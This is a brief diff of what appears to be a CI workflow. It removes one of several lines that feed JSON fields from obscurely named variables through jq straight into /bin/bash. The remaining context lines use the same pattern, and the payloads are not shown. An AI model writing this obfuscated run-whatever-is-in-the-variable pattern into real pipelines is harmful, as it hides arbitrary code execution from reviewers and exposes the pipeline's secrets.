@@ -25,7 +25,6 @@ jobs:
           echo $vzpx93 | jq -r .wfi9 | /bin/bash
           echo $vzpy9 | jq -r .vcra41 | /bin/bash
           printf '%s' "$jketk87" | jq -r .lzrm218 | /bin/bash
-          echo $bo0 | jq -r .qxf2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
